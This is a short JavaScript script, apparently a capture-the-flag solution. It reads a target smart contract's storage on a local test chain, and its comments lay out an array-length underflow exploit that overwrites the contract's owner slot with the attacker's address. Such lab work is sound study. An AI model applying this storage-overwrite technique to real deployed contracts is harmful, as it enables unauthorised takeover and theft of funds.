const fs = require('fs');
const { ethers, keccak256, toBeHex, zeroPad, BigNumber, zeroPadValue, getBytes } = require('ethers');
const { argv } = require('node:process');

const provider = new ethers.JsonRpcProvider('http://localhost:8545');
const privateKey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80';
const wallet = new ethers.Wallet(privateKey, provider);

const abi = JSON.parse(fs.readFileSync('build/Hack.abi', 'utf8'));

// const contractAddress = argv[2];
// const contract = new ethers.Contract(contractAddress, abi, wallet);


// contract.on("Attempt", (msg,succ) => {
//   console.log("Attempt:", msg,succ);
// });




async function main() {
  const target = "0x9083ADFE1674f031c5d9F243ea779CFA82E47d2a";
  const val1 = await provider.getStorage(target,0);
  console.log(val1)
  const val2 = await provider.getStorage(target,1);
  console.log(val2)
  const hash = keccak256(getBytes(toBeHex(1,32)));
  console.log(hash)
}

main().catch(console.error);

// await contract.retract() big length
// 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 1
// await contract.revise("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a","0x000000000000000000000000f39Fd6e51aad88F6F4ce6aB8827279cffFb92266")